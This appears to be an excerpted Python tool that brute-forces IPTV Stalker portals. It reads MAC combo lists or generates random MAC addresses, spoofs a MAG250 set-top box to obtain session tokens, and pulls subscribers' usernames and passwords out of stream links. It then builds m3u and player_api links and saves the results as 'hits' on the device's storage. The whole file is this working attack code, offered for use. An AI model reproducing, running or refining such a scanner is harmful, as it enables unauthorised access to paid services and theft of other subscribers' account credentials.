...
\33[1;44m
ꜱᴇʟᴇᴄᴛ 1 2 or 3 ꜰᴏʀ ᴘᴏʀᴛᴀʟ ᴛʏᴘᴇ =\33[0m\33[31m\33[1;37;41m"""
...
if "1" == "1":
    ...
    print("""ꜱᴇʟᴇᴄᴛ ᴀɴ ᴏᴘᴛɪᴏɴ:
"""+dsy+"""
\33[33m""" + str(say)+""" Files found in /sdcard/combo/
	""")
    dsyno = str(input(" \33[31mᴏᴘᴛɪᴏɴ =\33[0m"))
    say = 0
 ...
 ɴᴜᴍʙᴇʀ ᴏꜰ ᴍᴀᴄꜱ ᴛᴏ ɢᴇɴᴇʀᴀᴛᴇ
  ...
  Qᴜᴀɴᴛɪᴛʏ: """)
        ...
        if not dosyaa == "":
            ...
            subprocess.run(["clear", ""])
            subprocess.run(["clear", ""])
            print("ɪɴᴄᴏʀʀᴇᴄᴛ ᴄᴏᴍʙᴏ ꜰɪʟᴇ ꜱᴇʟᴇᴄᴛɪᴏɴ")
            quit()
        c = open(dosyaa, 'r')
        totLen = c.readlines()
        uz = (len(totLen))
...
botsay = input("""
   ...
   \33[1;96mɴᴜᴍʙᴇʀ ᴏꜰ ʙᴏᴛꜱ
\33[0m
    \33[1;33mᴛʜᴇ ᴍᴀxɪᴍᴜᴍ ɪꜱ 15 ʙᴏᴛꜱ\33[0m
...
Dosyab = "/sdcard/SpeedX_" + \
    panel.replace(":", "_").replace('/', '') + "@🔥🆂🅿🆁🔥.txt"
say = 1
...
def randommac():
    ...
    try:
        genmac = str(mactur)+"%02x:%02x:%02x" % ((random.randint(0, 256)),
...
url1 = "http://"+panel+"/"+uzmanm + \
    "?type=stb&action=handshake&prehash=false&JsHttpRequest=1-xml"


url2 = "http://"+panel+"/"+uzmanm + \
    "?type=stb&action=get_profile&JsHttpRequest=1-xml"
if realblue == "real":
    url2 = "http://"+panel+"/"+uzmanm+"?&action=get_profile&mac="+macs+"&type=stb&hd=1&sn=&stb_type=MAG250&client_type=STB&image_version=218&device_id=&hw_version=1.7-BD-00&hw_version_2=1.7-BD-00&auth_second_step=1&video_out=hdmi&num_banks=2&metrics=%7B%22mac%22%3A%22"+macs + \
...
url3 = "http://"+panel+"/"+uzmanm + \
    "?type=account_info&action=get_main_info&JsHttpRequest=1-xml"

url5 = "http://"+panel+"/"+uzmanm + \
    "?action=create_link&type=itv&cmd=ffmpeg%20http://localhost/ch/106422_&JsHttpRequest=1-xml"

url6 = "http://"+panel+"/"+uzmanm + \
    "?type=itv&action=get_all_channels&force_ch_link_check=&JsHttpRequest=1-xml"

liveurl = "http://"+panel+"/"+uzmanm + \
    "?action=get_genres&type=itv&JsHttpRequest=1-xml"

vodurl = "http://"+panel+"/"+uzmanm + \
    "?action=get_categories&type=vod&JsHttpRequest=1-xml"

seriesurl = "http://"+panel+"/"+uzmanm + \
    "?action=get_categories&type=series&JsHttpRequest=1-xml"


def url(cid):
    url7 = "http://"+panel+"/"+uzmanm+"?type=itv&action=create_link&cmd=ffmpeg%20http://localhost/ch/" + \
        str(cid)+"_&series=&forced_storage=0&disable_ad=0&download=0&force_ch_link_check=0&JsHttpRequest=1-xml"
    return url7
...
def goruntu(link):
    ...
    try:
        res = ses.get(link,  headers=hea3(), timeout=(
            2, 5), allow_redirects=False, stream=True)
        duru = "𝙑𝙋𝙉「 𝗞𝗨𝗟𝗟𝗔𝗡 」🔒✔ "
...
def list(listlink, macs, token, livel):
    ...
    while True:
        try:
            res = ses.get(listlink,  headers=hea2(
                macs, token), timeout=15, verify=False)
            veri = str(res.text)
            break
        except:
            bag = bag+1
...
def m3uapi(playerlink, macs, token):
    ...
    while True:
        try:
            res = ses.get(playerlink, headers=hea2(
                macs, token), timeout=7, verify=False)
            veri = ""
            veri = str(res.text)
            break
        except:
    ...
    try:
        ...
        if 'active_cons' in veri:
            ...
            message = veri.split('message":"')[1].split(',')[
                0].replace('"', '')

            if bitism == "null":
                bitism = "Unlimited"
            else:
                bitism = (datetime.datetime.fromtimestamp(
                    int(bitism)).strftime('%d-%m-%Y %H:%M:%S'))
...
def d1():
    ...
    for mac in range(1, uz, botsay):
        ...
        while True:
            try:
                res = ses.get(url1, headers=hea1(macs),
        ...
        if 'token' in veri:
            ...
            if not id == "null":
                ...
                if not veri.count('phone') == 0:
                    ...
                    while True:
                        try:
                            res = ses.get(url6, headers=hea2(
                                macs, token), timeout=10, verify=False)
                            veri = ""
                            veri = str(res.text)
                            cid = ""
                            cid = (str(res.text).split(
                                'ch_id":"')[5].split('"')[0])
                            break
                        except:
                            bag = bag+1
                    ...
                    while True:
                        try:
                            res = ses.get(url(cid), headers=hea2(
                                macs, token), timeout=15, verify=False)
                            veri = ""
                            veri = str(res.text)
                            link = veri.split('ffmpeg ')[1].split('"')[
                                0].replace('\/', '/')
                            real = 'http://' + \
                                link.split('://')[1].split('/')[0]+'/c/'
                            user = str(link.replace('live/', '').split('/')[3])
                            pas = str(link.replace('live/', '').split('/')[4])
                            m3ulink = "http://" + real.replace('http://', '').replace(
                                '/c/', '') + "/get.php?username=" + str(user) + "&password=" + str(pas) + "&type=m3u_plus"
                            durum = goruntu(link)
                            break
                        except:
                            bag = bag+1
                    ...
                    playerapi = ""
                    if not m3ulink == "":
                        playerlink = str("http://"+real.replace('http://', '').replace(
                            '/c/', '') + "/player_api.php?username="+user+"&password="+pas)

                        playerapi = m3uapi(playerlink, macs, token)
                        if playerapi == "":
                            playerlink = str("http://"+panel.replace('http://', '').replace(
                                '/c/', '') + "/player_api.php?username="+user+"&password="+pas)
                            playerapi = m3uapi(playerlink, macs, token)
                    ...
                    hit(mac, trh, real, m3ulink, durum, vpn,
                        livelist, vodlist, serieslist, playerapi)
